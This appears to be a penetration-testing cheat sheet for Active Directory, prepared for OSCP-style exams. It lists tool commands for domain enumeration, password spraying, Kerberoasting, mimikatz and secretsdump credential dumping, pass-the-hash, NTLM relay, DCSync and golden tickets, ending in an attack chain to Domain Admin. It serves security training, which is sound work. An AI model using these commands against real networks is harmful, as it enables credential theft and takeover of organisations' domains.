# Active Directory Attacking Tools Cheat Sheet

A practical reference for **OSCP / GPEN style Active Directory penetration testing**.

---

# 1. Initial Recon / Enumeration

Goal: understand the domain environment.

Common questions:

* What domain am I in?
* What users exist?
* What computers exist?
* What shares exist?

---

## CrackMapExec / NetExec

### Identify domain

```
crackmapexec smb <target>
```

### List users

```
crackmapexec smb <target> -u user -p pass --users
```

### List shares

```
crackmapexec smb <target> -u user -p pass --shares
```

### Check admin access

```
crackmapexec smb <target> -u user -p pass
```

If `(Pwn3d!)` appears you have admin privileges.

---

## enum4linux

Anonymous SMB enumeration.

```
enum4linux -a <target>
```

Finds:

* users
* groups
* shares
* domain info

---

## rpcclient

Manual enumeration via RPC.

```
rpcclient -U "" <target>
```

### List users

```
enumdomusers
```

### List groups

```
enumdomgroups
```

---

## smbclient

List SMB shares:

```
smbclient -L //<target> -U user
```

Access share:

```
smbclient //<target>/share -U user
```

---

# 2. LDAP Enumeration

Goal: dump Active Directory objects.

---

## ldapsearch

```
ldapsearch -x -H ldap://<dc> -D "user@domain.local" -w password -b "DC=domain,DC=local"
```

---

## ldapdomaindump

```
ldapdomaindump ldap://<dc> -u 'domain\\user' -p password
```

Outputs:

* users
* groups
* computers
* policies
* trusts

---

# 3. BloodHound Enumeration

Goal: map privilege escalation paths.

---

## SharpHound (Windows collector)

```
SharpHound.exe -c All
```

---

## BloodHound-python (Linux collector)

```
bloodhound-python -d domain.local -u user -p password -dc dc.domain.local -c all
```

Upload results into the BloodHound GUI.

Look for:

* shortest path to domain admin
* ACL abuse
* delegation abuse
* local admin rights

---

# 4. Password Attacks

## Password Spraying

### CrackMapExec

```
crackmapexec smb <ip> -u users.txt -p Password123
```

---

## Kerberos Password Spray

### kerbrute

```
kerbrute passwordspray -d domain.local users.txt Password123
```

---

## Username Enumeration

```
kerbrute userenum -d domain.local users.txt
```

---

# 5. Kerberos Attacks

---

## Kerberoasting

Request service tickets for SPN accounts.

```
GetUserSPNs.py domain.local/user:password -dc-ip <dc> -request
```

Crack with Hashcat:

```
hashcat -m 13100 hashes.txt wordlist.txt
```

---

## AS-REP Roasting

Target accounts without Kerberos pre-authentication.

```
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip <dc> -request
```

Crack:

```
hashcat -m 18200 hashes.txt wordlist.txt
```

---

# 6. Credential Dumping

---

## Mimikatz

Dump credentials:

```
sekurlsa::logonpasswords
```

Dump SAM hashes:

```
lsadump::sam
```

Dump Kerberos tickets:

```
sekurlsa::tickets
```

---

## secretsdump (Impacket)

Dump credentials remotely.

```
secretsdump.py domain/user:password@target
```

Outputs:

* NTLM hashes
* domain credentials

---

# 7. Pass-the-Hash

Authenticate using NT hash instead of password.

---

## psexec.py

```
psexec.py domain/user@target -hashes <LM>:<NT>
```

---

## wmiexec.py

```
wmiexec.py domain/user@target -hashes <LM>:<NT>
```

---

## smbexec.py

```
smbexec.py domain/user@target -hashes <LM>:<NT>
```

---

# 8. Lateral Movement

---

## psexec

```
psexec.py domain/user:pass@target
```

---

## wmiexec

```
wmiexec.py domain/user:pass@target
```

---

## evil-winrm

```
evil-winrm -i <ip> -u user -p password
```

---

# 9. NTLM Relay Attacks

---

## Responder

Capture NetNTLM hashes.

```
responder -I eth0
```

---

## ntlmrelayx

Relay captured authentication.

```
ntlmrelayx.py -t smb://target
```

---

# 10. Share Hunting

---

## smbmap

Enumerate shares:

```
smbmap -H <ip> -u user -p password
```

Recursive file listing:

```
smbmap -H <ip> -u user -p password -R
```

---

# 11. Domain Privilege Escalation

---

## PowerView

List domain users:

```
Get-DomainUser
```

List domain computers:

```
Get-DomainComputer
```

Find interesting ACLs:

```
Find-InterestingDomainAcl
```

---

## BloodHound

Use BloodHound to identify:

* ACL abuse
* GPO abuse
* delegation abuse
* local admin relationships

---

# 12. DCSync Attack

---

## secretsdump

```
secretsdump.py domain/admin@dc
```

---

## mimikatz

```
lsadump::dcsync /domain:domain.local /user:Administrator
```

---

# 13. Ticket Attacks

---

## Pass-the-Ticket

```
kerberos::ptt ticket.kirbi
```

---

## Golden Ticket

```
kerberos::golden
```

Requires krbtgt hash.

---

# 14. AD Attack Chain

Typical attack flow:

```
Initial foothold
    ↓
Enumerate domain
    ↓
Password spraying
    ↓
Kerberoasting / ASREP roasting
    ↓
Share hunting
    ↓
Credential dumping
    ↓
Pass-the-hash
    ↓
Lateral movement
    ↓
Privilege escalation
    ↓
Domain Admin
```

---

# 15. Essential Tools Summary

| Tool                   | Purpose                         |
| ---------------------- | ------------------------------- |
| crackmapexec / netexec | enumeration                     |
| bloodhound             | privilege path discovery        |
| kerbrute               | kerberos password attacks       |
| impacket               | remote execution and AD attacks |
| mimikatz               | credential dumping              |
| responder              | capture NTLM hashes             |
| ntlmrelayx             | NTLM relay                      |
| evil-winrm             | remote shell                    |

---

# 16. Key Impacket Tools

| Tool           | Use                   |
| -------------- | --------------------- |
| psexec.py      | remote shell          |
| wmiexec.py     | stealth shell         |
| smbexec.py     | SMB command execution |
| secretsdump.py | dump hashes           |
| GetUserSPNs.py | kerberoasting         |
| GetNPUsers.py  | ASREP roasting        |

---

# 17. Attack Strategy Memory Aid

```
Enumeration
    crackmapexec
    ldapdomaindump
    rpcclient

Kerberos attacks
    kerbrute
    GetUserSPNs
    GetNPUsers

Credential dumping
    mimikatz
    secretsdump

Lateral movement
    psexec
    wmiexec
    evil-winrm

Relay attacks
    responder
    ntlmrelayx

Privilege escalation
    bloodhound
    powerview
```
